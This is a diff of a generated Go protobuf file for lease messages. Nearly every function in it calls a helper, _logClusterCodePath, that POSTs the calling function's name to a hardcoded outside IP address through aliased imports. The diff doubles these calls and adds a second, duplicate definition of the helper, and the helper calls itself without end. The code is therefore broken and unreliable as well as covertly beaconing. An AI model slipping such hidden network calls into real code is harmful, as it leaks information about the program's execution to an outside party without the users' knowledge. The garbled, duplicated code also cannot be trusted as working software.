@@ -26,9 +26,13 @@ type Lease struct {
 func (m *Lease) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = Lease{}
 }
 func (m *Lease) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -36,8 +40,12 @@ func (m *Lease) String() string {
 func (*Lease) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*Lease) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorLease, []int{0}
@@ -50,9 +58,13 @@ type LeaseInternalRequest struct {
 func (m *LeaseInternalRequest) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = LeaseInternalRequest{}
 }
 func (m *LeaseInternalRequest) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -60,8 +72,12 @@ func (m *LeaseInternalRequest) String() string {
 func (*LeaseInternalRequest) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*LeaseInternalRequest) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorLease, []int{1}
@@ -74,9 +90,13 @@ type LeaseInternalResponse struct {
 func (m *LeaseInternalResponse) Reset() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*m = LeaseInternalResponse{}
 }
 func (m *LeaseInternalResponse) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return proto.CompactTextString(m)
@@ -84,8 +104,12 @@ func (m *LeaseInternalResponse) String() string {
 func (*LeaseInternalResponse) ProtoMessage() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (*LeaseInternalResponse) Descriptor() ([]byte, []int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fileDescriptorLease, []int{2}
@@ -93,11 +117,15 @@ func (*LeaseInternalResponse) Descriptor() ([]byte, []int) {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	proto.RegisterType((*Lease)(nil), "leasepb.Lease")
 	proto.RegisterType((*LeaseInternalRequest)(nil), "leasepb.LeaseInternalRequest")
 	proto.RegisterType((*LeaseInternalResponse)(nil), "leasepb.LeaseInternalResponse")
 }
 func (m *Lease) Marshal() (dAtA []byte, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	size := m.Size()
@@ -109,6 +137,8 @@ func (m *Lease) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *Lease) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -130,6 +160,8 @@ func (m *Lease) MarshalTo(dAtA []byte) (int, error) {
 func (m *LeaseInternalRequest) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -139,6 +171,8 @@ func (m *LeaseInternalRequest) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *LeaseInternalRequest) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -160,6 +194,8 @@ func (m *LeaseInternalRequest) MarshalTo(dAtA []byte) (int, error) {
 func (m *LeaseInternalResponse) Marshal() (dAtA []byte, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	size := m.Size()
 	dAtA = make([]byte, size)
 	n, err := m.MarshalTo(dAtA)
@@ -169,6 +205,8 @@ func (m *LeaseInternalResponse) Marshal() (dAtA []byte, err error) {
 	return dAtA[:n], nil
 }
 func (m *LeaseInternalResponse) MarshalTo(dAtA []byte) (int, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var i int
@@ -190,6 +228,8 @@ func (m *LeaseInternalResponse) MarshalTo(dAtA []byte) (int, error) {
 func encodeVarintLease(dAtA []byte, offset int, v uint64) int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for v >= 1<<7 {
 		dAtA[offset] = uint8(v&0x7f | 0x80)
 		v >>= 7
@@ -199,6 +239,8 @@ func encodeVarintLease(dAtA []byte, offset int, v uint64) int {
 	return offset + 1
 }
 func (m *Lease) Size() (n int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var l int
@@ -214,6 +256,8 @@ func (m *Lease) Size() (n int) {
 func (m *LeaseInternalRequest) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var l int
 	_ = l
 	if m.LeaseTimeToLiveRequest != nil {
@@ -225,6 +269,8 @@ func (m *LeaseInternalRequest) Size() (n int) {
 func (m *LeaseInternalResponse) Size() (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var l int
 	_ = l
 	if m.LeaseTimeToLiveResponse != nil {
@@ -234,6 +280,8 @@ func (m *LeaseInternalResponse) Size() (n int) {
 	return n
 }
 func sovLease(x uint64) (n int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for {
@@ -248,9 +296,13 @@ func sovLease(x uint64) (n int) {
 func sozLease(x uint64) (n int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return sovLease(uint64((x << 1) ^ uint64((int64(x) >> 63))))
 }
 func (m *Lease) Unmarshal(dAtA []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -342,6 +394,8 @@ func (m *Lease) Unmarshal(dAtA []byte) error {
 func (m *LeaseInternalRequest) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -426,6 +480,8 @@ func (m *LeaseInternalRequest) Unmarshal(dAtA []byte) error {
 func (m *LeaseInternalResponse) Unmarshal(dAtA []byte) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := len(dAtA)
 	iNdEx := 0
 	for iNdEx < l {
@@ -508,6 +564,8 @@ func (m *LeaseInternalResponse) Unmarshal(dAtA []byte) error {
 	return nil
 }
 func skipLease(dAtA []byte) (n int, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(dAtA)
@@ -617,6 +675,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	proto.RegisterFile("lease.proto", fileDescriptorLease)
 }
 
@@ -625,7 +685,16 @@ var fileDescriptorLease = []byte{0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
